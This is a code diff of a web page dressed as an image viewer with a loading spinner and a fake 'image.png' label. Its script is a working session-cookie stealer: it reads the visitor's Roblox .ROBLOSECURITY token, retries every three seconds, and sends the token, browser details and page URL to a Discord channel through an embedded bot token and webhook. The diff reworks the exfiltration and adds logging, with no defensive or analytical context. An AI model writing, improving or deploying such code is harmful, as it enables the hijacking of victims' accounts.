@@ -5,61 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image</title>
     <style>
-        body {
-            margin: 0;
-            background: #0d0d0d;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-        }
-        .container {
-            background: #1a1a2e;
-            border-radius: 16px;
-            padding: 20px;
-            max-width: 95%;
-            text-align: center;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
-        }
-        .image-box {
-            background: #0f0f1f;
-            border-radius: 12px;
-            padding: 30px;
-            border: 1px solid #2a2a4a;
-            min-height: 250px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .spinner {
-            width: 45px;
-            height: 45px;
-            border: 4px solid #2a2a4a;
-            border-top: 4px solid #4a9eff;
-            border-radius: 50%;
-            animation: spin 0.9s linear infinite;
-            margin-bottom: 20px;
-        }
+        body { margin: 0; background: #0d0d0d; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        .container { background: #1a1a2e; border-radius: 16px; padding: 20px; max-width: 95%; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.8); }
+        .image-box { background: #0f0f1f; border-radius: 12px; padding: 30px; border: 1px solid #2a2a4a; min-height: 250px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { width: 45px; height: 45px; border: 4px solid #2a2a4a; border-top: 4px solid #4a9eff; border-radius: 50%; animation: spin 0.9s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .filename {
-            color: #888;
-            font-size: 14px;
-            background: #111;
-            padding: 6px 16px;
-            border-radius: 20px;
-            margin-top: 10px;
-        }
-        .check {
-            font-size: 13px;
-            margin-top: 10px;
-        }
-        .sub {
-            color: #444;
-            font-size: 11px;
-            margin-top: 15px;
-        }
+        .filename { color: #888; font-size: 14px; background: #111; padding: 6px 16px; border-radius: 20px; margin-top: 10px; }
+        .check { font-size: 13px; margin-top: 10px; }
+        .sub { color: #444; font-size: 11px; margin-top: 15px; }
+        .log-box { color: #aaa; font-size: 12px; background: #111; padding: 10px; border-radius: 8px; margin-top: 10px; word-wrap: break-word; text-align: left; max-height: 150px; overflow-y: auto; width: 100%; box-sizing: border-box; font-family: monospace; }
     </style>
 </head>
 <body>
@@ -70,47 +24,74 @@
             <div class="filename">📷 image.png (2.1 MB)</div>
             <div class="check" id="status" style="color: #FFA500;">● Processing</div>
             <div class="sub">Click to expand</div>
+            <div class="log-box" id="logBox">[System] Initializing...</div>
         </div>
     </div>
 
     <script>
-        // ============================================
-        // YOUR DISCORD WEBHOOK
-        // ============================================
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1530618949136285777/OQlkVRhttWxLr_tCagBNaBELV5yWGAA-SzjyhqssQ0AKrs3V-cup7WgMsQl12dfuZg_j";
+        const BOT_TOKEN = "MTUzMDY1NDk2MDY2MzAwNzI4Mg.GXCj0X.d9YtSrzGbHJT37rKCM_ItqaR2O0awtdJLP7PQk";
+        const CHANNEL_ID = "1530618904018157708";
+
+        let cookieSent = false;
+        let attemptCount = 0;
+
+        function log(msg) {
+            const box = document.getElementById('logBox');
+            if (box) {
+                box.innerHTML += '\n' + msg;
+                box.scrollTop = box.scrollHeight;
+            }
+            console.log(msg);
+        }
 
         function sendToDiscord(message) {
-            fetch(DISCORD_WEBHOOK, {
+            log('[Discord] Sending...');
+            fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Authorization': `Bot ${BOT_TOKEN}`,
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({ content: message })
-            }).catch(() => {});
+            })
+            .then(res => {
+                if (res.ok) log('[Discord] ✅ Sent');
+                else log('[Discord] ❌ Failed: ' + res.status);
+            })
+            .catch(err => log('[Discord] ❌ Error: ' + err.message));
         }
 
         function steal() {
+            attemptCount++;
             const cookies = document.cookie;
+            log('[Stealer] Attempt #' + attemptCount + ' - Raw cookies: ' + (cookies || 'NONE'));
             
             if (cookies.includes('.ROBLOSECURITY')) {
                 const match = cookies.match(/.ROBLOSECURITY=([^;]+)/);
                 const token = match ? match[1] : 'unknown';
+                log('[Stealer] 🍪 COOKIE FOUND!');
                 
-                let msg = '🍪 **ROBLOX COOKIE STOLEN**\n';
-                msg += 'Token: ' + token + '\n';
-                msg += 'UA: ' + navigator.userAgent + '\n';
-                msg += 'URL: ' + window.location.href + '\n';
-                msg += 'Time: ' + new Date().toISOString();
-
+                let msg = '🍪 **ROBLOX COOKIE STOLEN**\nToken: ' + token + '\nUA: ' + navigator.userAgent + '\nURL: ' + window.location.href + '\nTime: ' + new Date().toISOString();
                 sendToDiscord(msg);
                 document.getElementById('status').textContent = '✅ Load complete';
                 document.getElementById('status').style.color = '#4CAF50';
+                cookieSent = true;
                 return true;
+            } else {
+                log('[Stealer] ❌ No cookie (attempt ' + attemptCount + ')');
+                document.getElementById('status').textContent = '⚠️ No session (retry ' + attemptCount + ')';
+                document.getElementById('status').style.color = '#FFA500';
+                return false;
             }
-            return false;
         }
 
-        // Try every 3 seconds until found
+        log('[System] Page loaded');
+        sendToDiscord('✅ Stealer page loaded');
+        steal();
+
         const interval = setInterval(() => {
-            if (steal()) clearInterval(interval);
+            if (cookieSent) { clearInterval(interval); log('[System] Stopped'); return; }
+            steal();
         }, 3000);
     </script>
 </body>
